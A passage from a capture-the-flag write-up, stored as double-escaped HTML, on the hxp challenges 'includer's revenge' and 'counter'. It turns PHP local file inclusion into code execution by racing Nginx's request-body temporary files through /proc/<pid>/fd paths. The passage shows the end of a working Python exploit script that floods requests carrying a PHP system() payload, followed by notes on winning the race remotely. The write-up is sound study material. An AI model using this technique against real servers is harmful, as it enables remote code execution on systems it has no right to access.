&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        pid &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;random.choice(nginx_pids)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;if &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;random.randint(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;1&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;== &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            path &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;f&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;#x2F;proc&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;{&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;pid&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;}&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;#x2F;cwd&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;else&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            path &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;f&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;#x2F;proc&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;{&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;pid&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;}&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;#x2F;root&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;return &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;path
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;read_file&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;requests_session&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;nginx_pid&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;fd&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;nginx_pids&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    nginx_pid_list &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;list&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(nginx_pids)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;while &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;True&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        path &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;generate_random_path_prefix(nginx_pid_list)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        path &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;f&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;#x2F;proc&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;{&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;nginx_pid&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;}&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;#x2F;fd&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;{&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;fd&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;}&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;try&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            d &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;requests_session.get(SERVER &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;f&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;#x2F;?action=include&amp;amp;amp;file=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;{path}&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;.text
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;except&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;continue
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# Flags are formatted as hxp{&amp;amp;lt;flag&amp;amp;gt;}
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;if &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;hxp&amp;amp;quot; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;in &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;d:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;print&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;Found flag! &amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;print&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(d)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;read_file_worker&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;requests_session&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;nginx_pid&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;nginx_pids&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# Scan Nginx FDs between 10 - 45 in a loop. Since files and sockets keep closing - it&amp;amp;#39;s very common for the request body FD to open within this range
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;for &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;fd &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;in &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;range&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;10&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;45&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        thread &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;threading.Thread(target &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;read_file, args &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(requests_session, nginx_pid, fd, nginx_pids))
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;thread.start()
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;read_file_multiprocess&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;requests_session&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;nginx_pids&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;for &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;nginx_pid &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;in &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;nginx_pids:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        p &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;multiprocessing.Process(target&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;read_file_worker, args&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(requests_session, nginx_pid, nginx_pids))
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;p.start()
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;if &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;__name__ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;== &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;__main__&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;print&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;[DEBUG] Creating requests session&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    requests_session &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;create_requests_session()
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;print&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;[DEBUG] Getting Nginx pids&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    nginx_pids &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;get_nginx_pids(requests_session)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;print&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;f&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;[DEBUG] Nginx pids: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;{nginx_pids}&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;print&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;[DEBUG] Starting payload sending&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;send_payload_multiprocess(requests_session)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;print&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;[DEBUG] Starting fd readers&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;read_file_multiprocess(requests_session, nginx_pids)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;Our exploit tries to get PHP to &amp;lt;code&amp;gt;include_once()&amp;lt;&amp;#x2F;code&amp;gt; Nginx’s request body temporary file before it’s deleted. In order to do that, we need to constantly create many HTTP requests with our payload as a (large) request body, as fast as possible.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;We use a &amp;lt;code&amp;gt;requests.Session&amp;lt;&amp;#x2F;code&amp;gt; object with a large pool configured in order to speed up our HTTP requests and reduce the TCP handshake overhead.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Afterwards, we loop over the processes to see which ones are Nginx workers, since we’ll need their PIDs to build the FD path leading to the request body files.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;After creating the session and retrieving the Nginx worker PIDs (if cache wasn’t used) - we run the main exploit logic in parallel by leveraging Python’s &amp;lt;code&amp;gt;multiprocessing&amp;lt;&amp;#x2F;code&amp;gt; (threads might won’t be enough in this case due to GIL):&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;We create a subprocess per CPU (in &amp;lt;code&amp;gt;send_payload_multiprocess()&amp;lt;&amp;#x2F;code&amp;gt;) and use that to constantly (&amp;lt;code&amp;gt;while True&amp;lt;&amp;#x2F;code&amp;gt;) send HTTP requests with a large request body containing our PHP payload (&amp;lt;code&amp;gt;system(&amp;quot;&amp;#x2F;runflag&amp;quot;)&amp;lt;&amp;#x2F;code&amp;gt; for these challenges). We used (nearly) 1MB payloads but anything between 16KB - 1MB should work (Nginx rejects request bodies larger than 1MB by default). The number of CPUs is crucial here since we need to create files fast enough to win the race.&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;We create a subprocess per Nginx worker with a thread for every FD (between 10 - 45). Each thread triggers the PHP &amp;lt;code&amp;gt;include_once()&amp;lt;&amp;#x2F;code&amp;gt; for &amp;lt;code&amp;gt;&amp;#x2F;proc&amp;#x2F;&amp;amp;lt;nginx worker pid&amp;amp;gt;&amp;#x2F;fd&amp;#x2F;&amp;amp;lt;fd&amp;amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;, while adding a randomly-generated prefix of chained paths as described above.&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ul&amp;gt;
&amp;lt;h2 id=&amp;quot;winning-the-race&amp;quot;&amp;gt;Winning the Race&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;The code in the implementation above worked pretty quickly on &amp;lt;code&amp;gt;includer&amp;#x27;s revenge&amp;lt;&amp;#x2F;code&amp;gt; both locally and on the remote server. But when running against &amp;lt;code&amp;gt;counter&amp;lt;&amp;#x2F;code&amp;gt; - we couldn’t get it to work remotely. The following code is taken from &amp;lt;code&amp;gt;counter&amp;lt;&amp;#x2F;code&amp;gt;‘s server:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;php&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-php &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-php&amp;quot; data-lang=&amp;quot;php&amp;quot;&amp;gt;&amp;lt;span&amp;gt;file_put_contents($page, file_get_contents($page) + 1);
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;include_once($page);
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;In addition to the Nginx creation and deletion race we now have another race - we need &amp;lt;code&amp;gt;file_put_contents()&amp;lt;&amp;#x2F;code&amp;gt; to write to the path before the content is in it, and &amp;lt;code&amp;gt;include_once()&amp;lt;&amp;#x2F;code&amp;gt; to be executed after Nginx writes the request body into it. This made us think - what happens when &amp;lt;code&amp;gt;file_put_contents()&amp;lt;&amp;#x2F;code&amp;gt; is called on the Nginx FD path after it’s deleted? When we looked into the request body directory (&amp;lt;code&amp;gt;&amp;#x2F;var&amp;#x2F;lib&amp;#x2F;nginx&amp;#x2F;body&amp;#x2F;&amp;lt;&amp;#x2F;code&amp;gt;) it was full with files formatted as &amp;lt;code&amp;gt;0000001337 (deleted)&amp;lt;&amp;#x2F;code&amp;gt; (the number is Nginx’s auto-incremented file format). These files filled 80% of our local Docker’s storage, but when querying the remote server (reading &amp;lt;code&amp;gt;&amp;#x2F;sys&amp;#x2F;block&amp;#x2F;sda&amp;#x2F;sda1&amp;#x2F;size&amp;lt;&amp;#x2F;code&amp;gt; via PHP) we found they have much more storage than us and we should be OK 🙂&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Even though the exploit worked locally for &amp;lt;code&amp;gt;counter&amp;lt;&amp;#x2F;code&amp;gt; (while filling the storage) - we couldn’t get it to work remotely, since winning the race is much less probable. Sniffing the traffic showed that there’s too much latency and packet loss at the rates we’re sending. Geo-locating the remote server showed that it’s in Germany while the exploit was running from US.&amp;lt;&amp;#x2F;p&amp;gt;
